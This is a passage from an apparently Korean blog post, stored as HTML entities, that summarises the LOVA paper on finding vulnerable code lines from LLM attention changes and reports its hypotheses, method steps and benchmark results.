&#xB35C; &#xCC3D;&#xC758;&#xC801;&#xC778; &#xACB0;&#xACFC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#x201C;&#xC774;&#xB7EC;&#xD55C; &#xBB34;&#xC791;&#xC704;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACB0;&#xACFC;&#xC758; &#xC815;&#xD655;&#xB3C4; &#xD5A5;&#xC0C1;&#xB3C4; &#xBBF8;&#xBBF8;&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC815;&#xD655;&#xD55C; &#xC704;&#xCE58;&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xAE30;&#xAC00; &#xD798;&#xB4E4;&#xB2E4;!&#x201D;&#xAC00; &#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC81C;&#xC2DC;&#xD558;&#xB294; &#xB450; &#xBC88;&#xC9F8; &#xBB38;&#xC81C;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-&#xAC00;&#xC124;-&#xBC0F;-&#xC2E4;&#xD5D8;"><a href="#2-2-&#xAC00;&#xC124;-&#xBC0F;-&#xC2E4;&#xD5D8;" class="headerlink" title="2.2 &#xAC00;&#xC124; &#xBC0F; &#xC2E4;&#xD5D8;"></a>2.2 &#xAC00;&#xC124; &#xBC0F; &#xC2E4;&#xD5D8;</h2><h3 id="1-&#xAC00;&#xC124;"><a href="#1-&#xAC00;&#xC124;" class="headerlink" title="1) &#xAC00;&#xC124;"></a>1) &#xAC00;&#xC124;</h3><ol><li>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC744; &#xB54C; &#xD2B9;&#xC815; &#xB77C;&#xC778;&#xC5D0; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xD558;&#xAC8C; &#xB41C;&#xB2E4;.</li><li>&#xD2B9;&#xC815; &#xB77C;&#xC778;&#xC5D0;&#xC11C; &#xCC3E;&#xC73C;&#xB77C;&#xACE0; &#xD558;&#xBA74; &#xC5B4;&#xD150;&#xC158;&#xC774; &#xB354; &#xAC15;&#xD558;&#xAC8C; &#xB418;&#xC11C; &#xC815;&#xD655;&#xB3C4;&#xB97C; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB77C;&#xC778;&#xC740; &#xBAA8;&#xB378; &#xCD9C;&#xB825;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xAC83;&#xC774;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xB77C;&#xC778;&#xC744; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD574;&#xB3C4; &#xACB0;&#xACFC;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;.</li></ol><h3 id="2-&#xC2E4;&#xD5D8;"><a href="#2-&#xC2E4;&#xD5D8;" class="headerlink" title="2) &#xC2E4;&#xD5D8;"></a>2) &#xC2E4;&#xD5D8;</h3><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; self-attention&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xBA3C;&#xC800; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs yaml"><span class="hljs-attr">Code:</span>    <span class="hljs-string">....</span> <span class="hljs-attr">8:</span>     <span class="hljs-string">glyphs</span> <span class="hljs-string">=</span> <span class="hljs-string">(cairo_glyph_t</span> <span class="hljs-string">*)</span> <span class="hljs-string">gmalloc</span> <span class="hljs-string">(len</span>    <span class="hljs-string">*</span> <span class="hljs-string">sizeof</span> <span class="hljs-string">(cairo_glyph_t));</span> <span class="hljs-attr">9:</span>     <span class="hljs-string">glyphCount</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span><span class="hljs-attr">10:</span> <span class="hljs-string">}</span><span class="hljs-string">Pay</span> <span class="hljs-string">attention</span> <span class="hljs-string">to</span> <span class="hljs-string">line</span> {<span class="hljs-number">8</span>}<span class="hljs-string">.</span> <span class="hljs-string">Check</span> <span class="hljs-string">whether</span> <span class="hljs-string">there</span> <span class="hljs-string">are</span> <span class="hljs-string">vulnerabilities</span> <span class="hljs-string">in</span> <span class="hljs-string">it.</span><span class="hljs-attr">vulnerable line:</span> <span class="hljs-string">```</span></code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC704;&#xC640; &#xAC19;&#xC774; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; ``` &#xB4A4;&#xC5D0; &#xB2E8;&#xC5B4;&#xB97C; &#xC608;&#xCE21;&#xD560; &#xB54C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xAC00;&#xC7A5; &#xB192;&#xAC8C; &#xC5B4;&#xD150;&#xC158;&#xD558;&#xACA0;&#xC8E0;? &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xC5B4;&#xB5A4; &#xB77C;&#xC778;&#xC778;&#xC9C0; &#xAE4C;&#xC9C0; &#xC54C;&#xB824;&#xC918;&#xC11C; &#xAC00;&#xC911;&#xCE58;&#xC758; &#xBCC0;&#xD654;&#xB97C; &#xADF9;&#xB300;&#xD654;&#xD574; &#xBCC0;&#xD654;&#xB97C; &#xAD00;&#xCC30;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/3.png" alt="index_img"></p><p>&#xC2E4;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC774;&#xB97C; &#xBCA0;&#xC774;&#xC2A4;&#xB85C; &#xCF54;&#xB4DC;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC778;&#xC704;&#xC801;&#xC73C;&#xB85C; &#xC0BD;&#xC785;&#xD574; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xC9C4;&#xD589;&#xD55C; &#xACB0;&#xACFC;,</p><ol><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC758; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; 70&#xBC88;&#xC9F8; &#xB77C;&#xC778;&#xC744; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xB2E4;&#xB978; &#xB77C;&#xC778;&#xB4E4;&#xC758; &#xAC00;&#xC911;&#xCE58;&#xAC00; &#xB192;&#xC740; &#xAC83;&#xC73C;&#xB85C; &#xB098;&#xC640; &#xC81C;&#xB300;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; 70&#xBC88;&#xC9F8; &#xB77C;&#xC778;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xD574;&#xC11C; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; 70&#xBC88;&#xC9F8; &#xB77C;&#xC778;&#xC774; &#xC880; &#xB354; &#xAC00;&#xC911;&#xCE58;&#xAC00; &#xC62C;&#xB77C;&#xAC14;&#xACE0; &#xC2E4;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xAC00;&#xC911;&#xCE58;&#xAC00; &#xB354; &#xB192;&#xAC8C; &#xB098;&#xD0C0;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xAC04;&#xB2E8;&#xD55C; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC5B4;&#xB290;&#xC815;&#xB3C4; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="3-LOVA-LO-cating-Vulnerabilities-via-Attention"><a href="#3-LOVA-LO-cating-Vulnerabilities-via-Attention" class="headerlink" title="3. LOVA(LO-cating Vulnerabilities via Attention)"></a>3. LOVA(LO-cating Vulnerabilities via Attention)</h1><p><img src="/2025/08/11/j0ker/llm_part3/kr/4.png" alt="index_img"></p><p>&#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC81C;&#xC548;&#xD558;&#xB294; LOVA&#xB294; &#xC704;&#xC5D0;&#xC11C; &#xC2E4;&#xD5D8;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xCF54;&#xB4DC;&#xC640; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD55C; &#xCF54;&#xB4DC;&#xC758; &#xAC00;&#xC911;&#xCE58;&#xB97C; &#xBE44;&#xAD50;&#xD574; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD560; &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xCF54;&#xB4DC; &#xB77C;&#xC778;&#xC744; &#xCC3E;&#xC544;&#xB0C5;&#xB2C8;&#xB2E4;.<br>&#xD06C;&#xAC8C; Code Line Highlight, Attention Calculation, Vulnerability Line Localization 3&#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xC529; &#xCC28;&#xADFC;&#xCC28;&#xADFC; &#xB72F;&#xC5B4;&#xBCF4;&#xC8E0;!</p><h2 id="3-1-Code-Line-Highlight"><a href="#3-1-Code-Line-Highlight" class="headerlink" title="3.1 Code Line Highlight"></a>3.1 Code Line Highlight</h2><p>LOVA&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xBC84;&#xC804;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xD558;&#xB098;&#xB294; &#xC544;&#xBB34;&#xAC83;&#xB3C4; &#xAC74;&#xB4DC;&#xB9AC;&#xC9C0; &#xC54A;&#xC740; &#xC6D0;&#xBCF8; &#xCF54;&#xB4DC;(Base prompt), &#xB2E4;&#xB978; &#xD558;&#xB098;&#xB294; &#xCF54;&#xB4DC; &#xD55C; &#xC904; &#xD55C; &#xC904;&#xC744; &#xB3CC;&#xC544;&#xAC00;&#xBA74;&#xC11C; &#xAC15;&#xC870;&#xD55C; &#xBC84;&#xC804;(Highlighted prompts)&#xC785;&#xB2C8;&#xB2E4;.  &#xB9CC;&#xC57D; &#xCF54;&#xB4DC;&#xAC00; 100&#xC904;&#xC774;&#xB77C;&#xBA74;, 1&#xAC1C;&#xC758; &#xC6D0;&#xBCF8; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC640; 100&#xAC1C;&#xC758; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xB41C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB418;&#xB294; &#xAC83;&#xC774;&#xC8E0;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C; &#xBB38;&#xC81C;&#xAC00; &#xD558;&#xB098; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xC8FC;&#xC11D;&#xC73C;&#xB85C; <code>// &#xC5EC;&#xAE30; &#xC880; &#xBD10;&#xC918;!</code> &#xB77C;&#xACE0; &#xD558;&#xAC70;&#xB098; &#xD2B9;&#xC815; &#xD0A4;&#xC6CC;&#xB4DC;&#xB97C; &#xB123;&#xB294; &#xBC29;&#xC2DD;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xAE38;&#xC5B4;&#xC9C0;&#xBA74; LLM&#xC774; &#xADF8;&#xB0E5; &#xBB34;&#xC2DC;&#xD574;&#xBC84;&#xB9AC;&#xAC70;&#xB098;, &#xC624;&#xD788;&#xB824; hallucination&#xC774; &#xBC1C;&#xC0DD;&#xD574; &#xBA40;&#xCA61;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xCDE8;&#xC57D;&#xD558;&#xB2E4;&#xACE0; &#xCC29;&#xAC01;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; LOVA&#xC5D0;&#xC11C;&#xB294; <strong>&#xCF54;&#xB4DC; &#xB77C;&#xC778; &#xC778;&#xB371;&#xC2A4;</strong>&#xB97C; &#xC9C1;&#xC811; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC; &#xC55E;&#xC5D0; &#xBC88;&#xD638;&#xB97C; &#xCAD9; &#xBD99;&#xC5EC;&#xC8FC;&#xACE0;, &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0; &#x2018;8&#xBC88; &#xB77C;&#xC778;&#xC5D0; &#xC9D1;&#xC911;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xBD10;&#xC918;!&#x2019; &#xB77C;&#xACE0; &#xBA85;&#xC2DC;&#xD558;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;.</p><h2 id="3-2-Attention-Calculation"><a href="#3-2-Attention-Calculation" class="headerlink" title="3.2 Attention Calculation"></a>3.2 Attention Calculation</h2><p>&#xB2E4;&#xC74C;&#xC740; &#xAC01; &#xB77C;&#xC778;&#xC744; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD305;&#xD588;&#xC744; &#xB54C; LLM&#xC758; &#x2018;&#xAD00;&#xC2EC;&#xB3C4;(Attention)&#x2019;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xBCC0;&#xD558;&#xB294;&#xC9C0; &#xC815;&#xB7C9;&#xC801;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. LLM&#xC774; &#xBC49;&#xC5B4;&#xB0B4;&#xB294; &#xC5B4;&#xD150;&#xC158; &#xB370;&#xC774;&#xD130;&#xB294; (num_tokens, num_tokens, num_layers, num_heads) &#xD615;&#xD0DC;&#xC758; &#xC5B4;&#xB9C8;&#xC5B4;&#xB9C8;&#xD558;&#xAC8C; &#xD070; &#xD150;&#xC11C;(Tensor)&#xC785;&#xB2C8;&#xB2E4;.  &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; 1000&#xD1A0;&#xD070;&#xC9DC;&#xB9AC; &#xCF54;&#xB4DC;&#xB9CC; &#xD574;&#xB3C4; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC218;&#xC5B5; &#xAC1C;&#xAC00; &#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294;&#xB370;&#x2026; &#xADF8;&#xB7FC; &#xC81C;&#xAC00; &#xC9C1;&#xC811; &#xBD84;&#xC11D;&#xD558;&#xB294;&#xAC8C; &#xB354; &#xBE60;&#xB974;&#xACA0;&#xC8E0;?</p><p>LOVA&#xB294; &#xC774; &#xAC70;&#xB300;&#xD55C; &#xB370;&#xC774;&#xD130;&#xB97C; &#x2018;&#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC;&#x2019; &#xB0A8;&#xAE30;&#xB3C4;&#xB85D; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCC28;&#xC6D0; &#xCD95;&#xC18C;(Dimensionality Reduction)&#xB97C; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/5.png" alt="index_img"></p><blockquote><p>Step 1 ~ 4&#xAE4C;&#xC9C0;&#xC758; &#xC288;&#xB3C4;&#xCF54;&#xB4DC;</p></blockquote><ol><li>&#xBAA8;&#xB4E0; &#xD5E4;&#xB4DC;&#xC758; &#xC5B4;&#xD150;&#xC158;&#xC744; (num_tokens, num_tokens, num_layers) &#xD615;&#xD0DC;&#xC758; &#xD558;&#xB098;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xB9F5;&#xC73C;&#xB85C; &#xD569;&#xC0B0;&#xD55C; &#xB4A4; &#xBCD1;&#xD569;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC01; &#xB808;&#xC774;&#xC5B4;&#xC758; &#xC5B4;&#xD150;&#xC158;&#xC740; &#xC11C;&#xB85C; &#xACE0;&#xC720;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC720;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xB9C8;&#xC9C0;&#xB9C9; &#xD1A0;&#xD070;&#xC744; &#xCFFC;&#xB9AC;(Q)&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC774;&#xC804;&#xC758; &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC5D0;&#xC11C; &#xC5BC;&#xB9C8;&#xB098; &#xB9CE;&#xC740; &#xC5B4;&#xD150;&#xC158;&#xC744; &#xAC00;&#xC9C0;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; (num_tokens, num_layers) &#xD06C;&#xAE30;&#xC758; &#xD589;&#xB82C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xAC01; &#xB77C;&#xC778;&#xC758; &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xAC12;&#xC744; &#xD569;&#xC0B0;&#xD558;&#xC5EC; &#xD55C; &#xB77C;&#xC778;&#xC758; &#xC804;&#xCCB4; &#xC5B4;&#xD150;&#xC158; &#xAC12;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; (num_lines, num_layers) &#xD06C;&#xAE30;&#xC758; &#xD589;&#xB82C;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC774; &#xD589;&#xB82C;&#xC744; LayerwiseAttnMat&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</li><li><p>&#xAC15;&#xC870; &#xD45C;&#xC2DC;&#xB41C; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC758; LayerwiseAttnMat&#xC640; &#xAE30;&#xBCF8; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xAC04;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; DiffAttnMat&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; &#xB77C;&#xC778;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xBCF4;&#xB294; &#xAC8C; &#xC544;&#xB2C8;&#xB77C;, &#xC2E4;&#xC81C; &#xBCC0;&#xD654;&#xAC00; &#xAC00;&#xC7A5; &#xD074; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB418;&#xB294; &#x2018;&#xC9C0;&#xC2DC;&#xBB38;&#x2019;&#xACFC; &#x2018;&#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xB41C; &#xB77C;&#xC778;&#x2019;&#xC758; &#xB370;&#xC774;&#xD130;&#xB9CC; &#xBF51;&#xC544;&#xC640; &#xCD5C;&#xC885;&#xC801;&#xC778; <code>VulnAttnMat</code>&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><p> <img src="/2025/08/11/j0ker/llm_part3/kr/6.png" alt="image.png"></p></li></ol><h2 id="3-3-Vulnerability-Line-Localization"><a href="#3-3-Vulnerability-Line-Localization" class="headerlink" title="3.3 Vulnerability Line Localization"></a><strong>3.3 Vulnerability Line Localization</strong></h2><p>&#xB9C8;&#xC9C0;&#xB9C9; &#xB2E8;&#xACC4;&#xB294; <code>VulnAttnMat</code>&#xC758; &#xD328;&#xD134;&#xC744; &#xBCF4;&#xACE0; &#xC9C4;&#xC9DC; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xB294; &#xB77C;&#xC778;&#xC744; &#xACE8;&#xB77C;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E8;&#xC21C;&#xD788; &#xC5B4;&#xD150;&#xC158; &#xBCC0;&#xD654;&#xB7C9; &#xD569;&#xACC4;&#xB85C; &#xC21C;&#xC704;&#xB97C; &#xB9E4;&#xAE38; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;, C&#xC5B8;&#xC5B4;&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xD134;&#xACFC; &#xD30C;&#xC774;&#xC36C;&#xC758; &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xD134;&#xC774; &#xB2E4;&#xB974;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5B8;&#xC5B4;&#xBCC4;&#xB85C; &#xC77C;&#xAD00;&#xB41C; &#xAE30;&#xC900;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xB610;, &#xC774;&#xAC74; &#xADF8;&#xB0E5; &#x2018;&#xC758;&#xC2EC; &#xC21C;&#xC704;&#x2019;&#xC77C; &#xBFD0;, &#x2018;&#xC774; &#xB77C;&#xC778;&#xC774; &#xCDE8;&#xC57D;&#xD560; &#xD655;&#xB960;&#xC774; 80%&#xB2E4;!&#x2019; &#xC640; &#xAC19;&#xC740; &#xC815;&#xD655;&#xD55C; &#xD310;&#xB2E8;&#xC744; &#xB0B4;&#xB824;&#xC8FC;&#xC9C4; &#xBABB;&#xD558;&#xC8E0;. &#xADF8;&#xB798;&#xC11C; LOVA&#xB294; &#xC774; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <strong>Bi-LSTM</strong>&#xC774;&#xB77C;&#xB294; &#xB525;&#xB7EC;&#xB2DD; &#xBAA8;&#xB378;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.(&#xC73C;&#xC73C;&#x2026; &#xC810;&#xC810;&#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9C0;&#xB294;&#x2026;)</p><ol><li>&#xBA3C;&#xC800; &#xAC01; &#xB77C;&#xC778;&#xBCC4;&#xB85C; &#xACC4;&#xC0B0;&#xB41C; <code>VulnAttnMat</code>&#xC744; &#xAE38;&#xAC8C; &#xD3B8; &#xBCA1;&#xD130;&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xBCA1;&#xD130; &#xC2DC;&#xD000;&#xC2A4;&#xB97C; Bi-LSTM &#xBAA8;&#xB378;&#xC5D0; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. Bi-LSTM&#xC744; &#xC4F0;&#xB294; &#xC774;&#xC720;&#xB294; &#xD2B9;&#xC815; &#xB77C;&#xC778;(A)&#xC774; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4;&#xC9C0; &#xD310;&#xB2E8;&#xD560; &#xB54C;, &#xADF8; &#xC55E;&#xB4A4; &#xB77C;&#xC778;(B, C)&#xB4E4;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xD328;&#xD134;&#xACFC; &#xBE44;&#xAD50;&#xD574;&#xC11C; &#xD310;&#xB2E8;&#xD558;&#xB294; &#xAC83;&#xC774; &#xB354; &#xC815;&#xD655;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC989;, &#xC804;&#xCCB4; &#xCF54;&#xB4DC;&#xC758; &#xBB38;&#xB9E5;(Context)&#xC744; &#xC591;&#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xACE0;&#xB824;&#xD558;&#xB294; &#xAC70;&#xC8E0;.</li><li>&#xBAA8;&#xB378;&#xC740; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xAC01; &#xB77C;&#xC778;&#xC5D0; &#xB300;&#xD574; 0&#xACFC; 1 &#xC0AC;&#xC774;&#xC758; &#x2018;&#xC758;&#xC2EC; &#xC810;&#xC218;(Suspicious Score)&#x2019;&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xACE0;, &#xC774; &#xC810;&#xC218;&#xAC00; 0.5&#xB97C; &#xB118;&#xC73C;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB77C;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ol><h1 id="4-&#xACB0;&#xACFC;"><a href="#4-&#xACB0;&#xACFC;" class="headerlink" title="4. &#xACB0;&#xACFC;"></a>4. &#xACB0;&#xACFC;</h1><p>&#xD14C;&#xC2A4;&#xD2B8;&#xB294; Big-Vul, SmartFix, CVEFixes &#xBCA4;&#xCE58;&#xB9C8;&#xD06C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD588;&#xC73C;&#xBA70; Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, Phi3.5-mini-instruct &#xAC19;&#xC774; 10B &#xC774;&#xD558;&#xC758; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xD65C;&#xC6A9;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>LOVA&#xB294; &#xAE30;&#xC874; LLM&#xC758; &#xC9C1;&#xC811; &#xCD9C;&#xB825; &#xBC29;&#xC2DD;&#xC5D0; &#xBE44;&#xD574; &#xB6F0;&#xC5B4;&#xB09C; &#xCDE8;&#xC57D;&#xC810; &#xC704;&#xCE58; &#xD2B9;&#xC815; &#xB2A5;&#xB825;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xBA70;, &#xD2B9;&#xD788; &#xAE34; &#xCF54;&#xB4DC; &#xB9E5;&#xB77D;&#xC5D0;&#xC11C; F1-score &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCD5C;&#xB300; 5&#xBC30;&#xC758; &#xC131;&#xB2A5; &#xD5A5;&#xC0C1;&#xC744; &#xB2EC;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>LOVA&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xB6F0;&#xC5B4;&#xB09C; &#xCDE8;&#xC57D;&#xC810; &#xC704;&#xCE58; &#xD2B9;&#xC815; &#xACB0;&#xACFC;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xBA70;, &#xCD5C;&#xB300; 14.6&#xBC30;&#xC758; &#xD5A5;&#xC0C1;&#xC744; &#xBCF4;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>LOVA&#xB294; &#xB2E4;&#xC591;&#xD55C; LLM &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xC801;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xC77C;&#xAD00;&#xB41C; &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xC0C1;&#xC801;&#xC778; &#xC131;&#xB2A5;&#xC744; 